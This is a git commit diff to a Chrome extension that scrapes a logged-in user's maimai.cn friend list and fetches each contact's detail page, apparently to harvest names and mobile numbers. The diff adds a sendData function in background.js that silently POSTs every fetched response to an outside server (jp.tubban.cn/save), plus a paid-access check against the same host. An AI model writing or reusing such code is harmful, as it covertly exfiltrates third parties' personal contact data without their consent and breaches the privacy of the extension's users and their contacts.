4a4445647ffb97e610fc7d5d3f17cede395873fc
GeJusdot <tianmg@tianmgdeMacBook-Pro.local>
2017-04-25 17:44:30 +0800

    support backgroud config

--- background.js
+++ background.js
@@ -1,24 +1,67 @@
 //background.js
 chrome.runtime.onConnect.addListener(function(port) {
   console.assert(port.name == "ILoveYou");
+  //alert(1000)
   port.onMessage.addListener(function(msg) {
-    for(i=0;i<msg.urls.length;i++){
-      url = msg.urls[i]
-      var oReq = new XMLHttpRequest();  
+    do_request(msg.urls,port)
+   
+  });    
+});
+
+async function do_request(urls,port){ 
+
+ for(i=0;i<urls.length;i++){
+      url = urls[i];
+      await sleep(1000);
+      var oReq = new XMLHttpRequest(); 
       oReq.onreadystatechange = function(data) {
-        if (oReq.readyState == 4) {
-          if (oReq.status == 200) {
-            port.postMessage({result:oReq.responseText});
+      if (oReq.readyState == 4) {
+        if (oReq.status == 200) {
+          sendData(oReq.responseText)
+          port.postMessage({result:oReq.responseText});
+        } else {
+        }
+      }
+    }
+    oReq.open("get", url, false);
+    oReq.send();
+  } 
+
+}
+
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms))
+}
+
+async function sendData(data){
+  data=encodeURIComponent(data)
+  //data =JSON.parse(data);
+  var url = 'http://jp.tubban.cn/save';
+  //var url = 'http://127.0.0.1:8888/save?data='+data;
+  //var url = 'http://127.0.0.1:8888/save';
+  //url = encodeURI(url)
+  await sleep(200)
+  var xhr = new XMLHttpRequest();    
+  xhr.open("post", url, false);
+  xhr.setRequestHeader("Content-Type" , "application/x-www-form-urlencoded");
+  xhr.send('data='+data);
+  
+  
+}
+
+chrome.runtime.onConnect.addListener(function(port) {
+  console.assert(port.name == "goodbye");
+  port.onMessage.addListener(function(msg) {
+      var xhr = new XMLHttpRequest();  
+      xhr.onreadystatechange = function(data) {
+        if (xhr.readyState == 4) {
+          if (xhr.status == 200) {
+            port.postMessage({result:xhr.responseText});
           } else {
-            //alert(5)
           }
         }
       }
-     oReq.open("get", url, false);
-     oReq.send();
-   } 
-
-  });
-    
+     xhr.open("get", msg.url, false);
+     xhr.send();
+  });    
 });
-
--- work.js
+++ work.js
@@ -2,6 +2,8 @@
 
   var harWithContent = [];
   var maimailist = '';
+  var authUrl = 'http://jp.tubban.cn/getauth/'
+  //var authUrl = 'http://127.0.0.1:8888/getauth/'
   
 
   function canUseMai(uid){
@@ -19,6 +21,26 @@
     return canUseMai || "cannot get maimai";
   }
 
+var error=false;
+function contectForAuth(entry){
+    uid = getMaiMaiUid(entry)
+    url = authUrl + uid;
+    var port = chrome.runtime.connect({name: "goodbye"});
+    port.postMessage({url: url});
+    port.onMessage.addListener(function(msg) {
+      //alert(msg.result)
+      var userInfo = JSON.parse(msg.result);
+      if(Date.parse(userInfo.maimai_expire) > new Date().getTime()
+        && userInfo.can_use_maimai){
+        getAllMaimaiFriend(entry.responseBody);
+      }else{
+        error="you donot have privilege, please call my owner!";
+        initText(error);
+      }      
+    });
+  }
+
+
   function getHarContent(HarLog) {
     if(HarLog.pages[0].title == 'https://maimai.cn/im/'){
         HarLog.entries.map(getMaiMaiList); 
@@ -33,14 +55,30 @@
         entry.getContent(content => {
           entry.responseBody = content;
           harWithContent.push(entry);
-          isCan = canUseMai(getMaiMaiUid(entry))
-          if( isCan=== true){
+          //contectForAuth(getMaiMaiUid(entry))
+          contectForAuth(entry)
+          //alert(error)
+          //setTimeout(get(content),3000)
+          /*
+          if( error=== true){
             getAllMaimaiFriend(content);
           }else{
-            initText(isCan);
-          }   
+            initText(error);
+          }  
+          */ 
         }) 
     } 
+  }
+
+  function get(content){
+    if(error === false){
+      setTimeout(get(content),1000)
+    }
+    if( error=== true){
+      getAllMaimaiFriend(content);
+    }else{
+      initText(error);
+    }  
   }
 
   function getMaiMaiUid(entry){
@@ -59,10 +97,13 @@
     for(one in maimailistObj.data){
       url = "https://maimai.cn/contact/detail/"+ String(maimailistObj.data[one].id) + "?jsononly=1"
       urllist.push(url)
+      //break;
     }
+
     if(urllist.length == 0 ){
       document.getElementById('msg').innerHTML = "你没有好友或者你操作方式有误";
     }
+   // alert(urllist.length)
     contentToBg(urllist);
   }
 
@@ -100,6 +141,8 @@
   }
 
   function getNetwork() {
+    //var res = contectForAuth(1657081);
+
     chrome.devtools.network.getHAR(getHarContent); 
     text =  "name,mobile";
     setTimeout(initText(text),5000);  
